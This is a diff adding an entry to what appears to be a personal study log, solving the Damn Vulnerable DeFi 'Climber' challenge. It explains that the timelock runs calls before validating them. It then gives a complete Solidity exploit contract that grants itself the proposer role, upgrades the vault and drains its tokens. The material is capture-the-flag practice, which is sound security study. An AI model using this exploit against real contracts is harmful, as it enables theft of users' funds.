@@ -484,4 +484,91 @@ contract PuppetV2Exploit {
     }
 ```
 
+### 2024.09.05
+
+- Damn Vulnerable DeFi: Climber
+
+#### Climber
+
+Issue:
+
+The main issue should related to the CHECK-EFFECT-PATTERN broken, which allows anyone run function call first then check the operation validity:
+```solidity
+        bytes32 id = getOperationId(targets, values, dataElements, salt);
+
+        for (uint8 i = 0; i < targets.length; ++i) {
+            targets[i].functionCallWithValue(dataElements[i], values[i]);
+        }
+
+        if (getOperationState(id) != OperationState.ReadyForExecution) {
+            revert NotReadyForExecution(id);
+        }
+```
+
+Solve: 
+
+```solidity
+contract ClimberExploit{
+
+    address payable timeLock;
+    address token;
+    address vault;
+    address player;
+    address recovery;
+
+    address[] targets;
+    uint256[] values;
+    bytes[] dataElements;
+
+    function exploit(address payable _timeLock, address _token, address _vault, address _player, address _recovery) public {
+
+        MyImplementation mi = new MyImplementation();
+
+        timeLock = _timeLock;
+        token = _token;
+        vault = _vault;
+        player = _player;
+        recovery = _recovery;
+
+        targets = new address[](4);
+        values = new uint256[](4);
+        dataElements = new bytes[](4);
+
+        targets[0] = timeLock;
+        values[0] = 0;
+        dataElements[0] = abi.encodeWithSignature("updateDelay(uint64)", 0);
+
+        targets[1] = timeLock;
+        values[1] = 0;
+        dataElements[1] = abi.encodeWithSignature("grantRole(bytes32,address)", PROPOSER_ROLE, address(this));
+
+        targets[2] = vault;
+        values[2] = 0;
+        dataElements[2] = abi.encodeWithSignature("upgradeToAndCall(address,bytes)", address(mi), "");
+
+        targets[3] = address(this);
+        values[3] = 0;
+        dataElements[3] = abi.encodeWithSignature("schedule()");
+
+        ClimberTimelock(timeLock).execute(targets, values, dataElements, bytes32(0));
+
+        MyImplementation(address(vault)).drain(address(token), recovery);
+
+    }
+
+
+    function schedule() public{
+        ClimberTimelock(timeLock).schedule(targets, values, dataElements, bytes32(0));
+    }
+}
+
+contract MyImplementation is ClimberVault{
+
+    function drain(address token, address receipent) public{
+        DamnValuableToken(token).transfer(receipent, DamnValuableToken(token).balanceOf(address(this)));
+    }
+
+}
+```
+
 <!-- Content_END -->
